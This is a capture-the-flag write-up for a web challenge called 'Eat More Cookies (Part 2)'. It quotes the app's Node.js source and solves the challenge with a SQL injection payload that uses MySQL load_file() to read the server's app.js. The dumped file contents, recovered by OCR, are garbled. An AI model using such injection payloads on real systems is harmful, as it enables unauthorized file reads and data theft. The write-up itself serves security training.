# Eat More Cookies (Part 2)
> `-`

## About the Challenge
We got a website and also the source code (You can download the source code [here](EatMoreCookiespt2.zip)). Here is the preview of the website


[Image extracted text: https:IIwaynestateuniversity-ctf24-eatmorecookiespart2 chals iollogin
Login
Username
Password
Login]


If we check the source code, especially this part:

```js
app.get("/searchcookies", isAuthenticated, async (req, res, next) => {
  cookies = req.query.cookies;

  const query = `SELECT * FROM cookies WHERE flavor = "${cookies}"`;

    pool.query(query, (err, result) => {
      if(err){
        return next(err)
      }

    return res.status(200).render("index", {cookies: result || []})
    });
})
```

The `cookies` parameter is vulnerable to SQL injection, and we can get the flag by accessing `/flag` endpoint

```js
app.get("/flag", isAdmin, (req, res, next) => {

  return res.json({"flag": "WSUCTF{F4ke_Flag}"})
})
```

But we need to login as administrator first:

```js
app.post("/adminLogin", async (req, res, next) => {
  const { username, password } = req.body;
  const query = 'SELECT * FROM users WHERE username = ? LIMIT 1';
    try {
    pool.query(query, [username], async (err, result) => {

      user = result[0];

      console.log(user);

      if(!user){
        return res.json({message: "User not found. Please try again."})
      }

      let comparePassword = await bcrypt.compare(password, user.password);

      if(username == "Administrator" && comparePassword){
        req.session.username = "Admin";
        req.session.isAdmin = true;
    
        return res.json({"message": "Successfully logged in as adminstrator."})
      } else if(comparePassword){
        return res.json({"message": "You are logged in, but you aren't administrator. You could've used the regular login instead!"})
      } else {
        return res.json({"message": "Invalid username or password. Please try again."})
      }
    })
  } catch (err) {
    return next(err)
  }

})
```

## How to Solve?
To solve this chall, im using unintended way. Im using `load_file()` MySQL function to read local file and then read `app.js` file

```
" union select 1,load_file('/app/src/app.js'),3-- -
```


[Image extracted text: Search for your favorite cookie to see if we have it at WSU:
chocolate chip
Search
Here are your Cookies
Cookie Name: 3 Cookie Flavor: const express = require('express' ); const bodyParser = require(body-parser'); const path = require( 'path'); const session = reg
const
mySQLStore
require('
express-mysql-session")(session); const bcrypt = require( bcrypt'); const isAuthenticated = require(" Imiddlewarelauthenticate
require(" ImiddlewarelisAdmin"); const app = express(); const dbconfig = {
user: 'WSUuser'
host: 'localhost' , database: 'eatmorecookies' , password: 'Waynes
mysgl createPool({-dbconfig, connectionLimit: 10}); const sessionStore
new
mySQLStore({-dbconfig, connection: pool, createDatabaseTable: true}) ap_
engine' , 'ejs'); app.use(bodyParser:jsonO); app use(bodyParser:urlencoded({extended: true})) app.use( session({ name:
userCookie"
store: sessionStore_
sec
saveUninitialized: false , cookie: {maxAge: 24 * 60 * 60 * 1000, sameSite: "lax"} , httpOnly: true , saveUninitialized: false }) )
app-get(/' ,
res, next) =>
res
~status(200) render( "index'
{cookies: [I}); } else
return res redirect( "/login") } }); app-post( "/register" , async (reg, res, next) => { const {username , pas=
bcrypt hash(password, 10); console log(await bcrypt hash( "PleaseDontCrackMe'
10)) try { const query = "INSERT INTO users (username , password) VAL
hashedPassword], (erT, result) => { if(err) { console log(err); } console log("Data inserted successfully
+
result); }); } catch (error)
return next(error); } //
using sql) in order for this challenge to work. You can do this by changing, the admin users password and username in the entrypoint sh file, then logging in
{ I/ const adminCookieData = { "cookie": { "originalMaxAge":86400000 , "expires'
:"2024-04-20T19.21.29.400Z"
'httpOnly":true ,"path":"/"
sameSite" _
"lax
'xxx'; I/ const expirationTimestamp = 1712172179; // const serializedData = JSON.stringify(adminCookieData); // const query =
INSERT INTO sessions
pool.query(query, [sessionld, serializedData , expirationTimestamp] , (erT, result) => { // if (err) { I/ console log( "Error inserting data into the database:'
err);
successfully:'
result); // } // H; // } catch(error) { /l return next(error); // } return res json({message: "Successfully registered userl"}) }) app-get("/login" _
asy
app-get( "/register"
async (reg, res, next) => { res render( "register"); }); app-get( "Isearchcookies'
isAuthenticated, async (reg, res, next) => { cookies = req_
WHERE flavor =
S{cookies}'
pool query(query, (err, result) => { if(err) { return next(err) } return res status(200) render("index"
{cookies: result II [J}) })
username , password }
=
reg body; const query = 'SELECT * FROM users WHERE username =
2 LIMIT 1; try
Lquery(query, [username] , async (err,
return res json({message: "User not found. Please try
"H) } let comparePassword = await bcrypt compare(password, userpassword); if (comparePassw
res json({message: "Logged in. Please visit the home page."}) } else { return res json({message: 'Invalid username Or password'}); } }) } catch (err) { return
next) => { const
username , password } = reg body; const query = 'SELECT * FROM users WHERE username = ? LIMIT 1'; try
pool query(query, [userr
console log(user); if(luser) { return res json({message: "User not found. Please try
H) } let comparePassword = await bcrypt compare(password, user
comparePassword) { reg-session.username
Admin 
req-session.isAdmin = true; return res json( { "message'
"Successfully logged in as adminstrator:"}) }
"You are logged in, but you aren't administrator: You could've used the regular login instead! "}) } else { return res json( { "message'
"Invalid username or paz
next(err) } }) app-get("/flag"
isAdmin, (reg, res, next) =>
return res json( { "flag"
"WSUCTF{Sesslon_IDs_m4ch_
more_v4lner9ble_th9n_I_THOught}"})
const status = err:status II 500; const message = err message Il 'Internal Server Error';
res status(status) send(message); }); app listen(3000 , "0.0.0.0"
=>
(req,
~
pool.
again '
again. ']


```
WSUCTF{Sess1on_IDs_m4ch_more_v4lner9ble_th9n_I_TH0ught}
```